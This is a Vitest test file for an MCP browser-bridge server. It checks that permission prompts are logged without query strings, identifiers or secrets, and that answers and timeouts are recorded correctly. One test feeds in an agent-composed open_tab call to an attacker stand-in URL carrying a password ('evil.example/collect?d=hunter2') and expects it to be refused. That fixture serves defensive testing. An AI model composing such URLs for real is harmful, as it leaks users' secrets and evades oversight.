import { afterEach, expect, test, vi } from "vitest";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { AccessPolicy } from "../../src/access/policy.js";
import type { BrowserBridge, TabInfo } from "../../src/mcp/bridge.js";
import { FakeBridge } from "../../src/mcp/fake-bridge.js";
import { generateToken, startMcpServer } from "../../src/mcp/server.js";
import { ASK_TIMEOUT_MS, askScope, noted, placeOf, type AskLine } from "../../src/mcp/asks.js";

afterEach(() => vi.useRealTimers());

test("placeOf keeps the host and the path, never the query, the fragment or id-like segments", () => {
  expect(placeOf("https://mail.example.com/mail/u/0/?q=secret#inbox/FMfcgz")).toEqual({ site: "mail.example.com", path: "/mail/u/0/" });
  expect(placeOf("https://bank.example/accounts/12345678/statement?iban=FR76")).toEqual({ site: "bank.example", path: "/accounts/:x/statement" });
  expect(placeOf("https://x.example/reset/abcDEF123ghiJKL456mnoPQR789")).toEqual({ site: "x.example", path: "/reset/:x" });
  expect(placeOf("https://x.example/u/jane%40doe.example/⟨id-1⟩")).toEqual({ site: "x.example", path: "/u/:x/:x" });
  expect(placeOf("open_tab {\"url\":\"https://a.example/?q=1\"}")).toEqual({ site: null, path: null });
  expect(placeOf(undefined)).toEqual({ site: null, path: null });
});

test("noted writes the card's why, then its answer under the same id", async () => {
  const lines: AskLine[] = [];
  const yes = await askScope.run({ tool: "read_tab", chat: "c1", window: "w1", agent: "claude", mode: "browser" }, () =>
    noted((l) => lines.push(l), { kind: "read-tab", rule: "tab-not-granted", url: "https://a.example/p?token=abc" }, async () => true, Boolean),
  );
  expect(yes).toBe(true);
  expect(lines).toHaveLength(2);
  expect(lines[0]).toMatchObject({ kind: "read-tab", rule: "tab-not-granted", tool: "read_tab", chat: "c1", window: "w1", agent: "claude", mode: "browser", site: "a.example", path: "/p" });
  expect(lines[1]).toMatchObject({ id: lines[0]!.id, answer: "allow-once" });
  expect(JSON.stringify(lines)).not.toContain("token=abc");
});

test("noted: a conversation card's yes, a no, a taken-down card, a lapsed card, a failing sink", async () => {
  const answers: string[] = [];
  const sink = (l: AskLine) => void ("answer" in l && answers.push(l.answer));
  await noted(sink, { kind: "history", rule: "r" }, async () => true, Boolean);
  await noted(sink, { kind: "read-tab", rule: "r" }, async () => false, Boolean);
  const gone = new AbortController();
  gone.abort();
  await noted(sink, { kind: "read-tab", rule: "r" }, async () => false, Boolean, gone.signal);
  vi.useFakeTimers();
  const late = noted(sink, { kind: "read-tab", rule: "r" }, () => new Promise<boolean>((ok) => setTimeout(() => ok(false), ASK_TIMEOUT_MS)), Boolean);
  await vi.advanceTimersByTimeAsync(ASK_TIMEOUT_MS);
  await late;
  vi.useRealTimers();
  expect(answers).toEqual(["allow-conversation", "refuse", "dismissed", "timeout"]);
  const spy = vi.spyOn(console, "error").mockImplementation(() => {});
  await expect(noted(() => { throw new Error("disk full"); }, { kind: "read-tab", rule: "r" }, async () => true, Boolean)).resolves.toBe(true);
  spy.mockRestore();
});

test("a card asked through the MCP server is logged with its tool and its conversation, without the page's query", async () => {
  const tab: TabInfo = { id: "mail", title: "Inbox", url: "https://mail.example.com/mail/u/0/?q=from%3Abank#inbox", space: "perso" };
  const bridge = new FakeBridge([tab], { active: "mail", allow: true });
  const lines: AskLine[] = [];
  (bridge as BrowserBridge).noteAsk = (l) => lines.push(l);
  const token = generateToken();
  const server = await startMcpServer({ lab: () => true, locale: () => "fr", bridge, policy: new AccessPolicy(), token });
  const session = server.openSession("w1", "claude", "chat-1", "browser");
  const client = new Client({ name: "test", version: "0" });
  await client.connect(new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${server.port}/mcp`), { requestInit: { headers: { Authorization: `Bearer ${session}` } } }));
  try {
    await client.callTool({ name: "read_tab", arguments: { id: "mail" } });
    expect(lines[0]).toMatchObject({ kind: "read-tab", rule: "tab-not-granted", tool: "read_tab", window: "w1", chat: "chat-1", mode: "browser", site: "mail.example.com", path: "/mail/u/0/" });
    expect(lines[1]).toMatchObject({ id: lines[0]!.id, answer: "allow-once" });
    const json = JSON.stringify(lines);
    for (const leak of ["from", "bank", "inbox", "Inbox"]) expect(json).not.toContain(leak);
  } finally {
    await client.close();
    await server.stop();
  }
});

test("an address the agent wrote is logged by its rule, the card never gets the log's code", async () => {
  const bridge = new FakeBridge([], { address: false });
  const lines: AskLine[] = [];
  (bridge as BrowserBridge).noteAsk = (l) => lines.push(l);
  const token = generateToken();
  const server = await startMcpServer({ lab: () => true, locale: () => "fr", bridge, policy: new AccessPolicy(), token });
  const client = new Client({ name: "test", version: "0" });
  await client.connect(new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${server.port}/mcp`), { requestInit: { headers: { Authorization: `Bearer ${token}` } } }));
  try {
    await client.callTool({ name: "open_tab", arguments: { url: "https://evil.example/collect?d=hunter2", reason: "my secret plan" } });
    expect(lines[0]).toMatchObject({ kind: "address-composed", rule: "address-unread", tool: "open_tab", chat: null, site: "evil.example", path: "/collect" });
    expect(lines[1]).toMatchObject({ id: lines[0]!.id, answer: "refuse" });
    expect(JSON.stringify(lines)).not.toMatch(/hunter2|secret plan/);
    expect(bridge.calls.find((c) => c.method === "askAddress")!.args[0]).not.toHaveProperty("why");
  } finally {
    await client.close();
    await server.stop();
  }
});
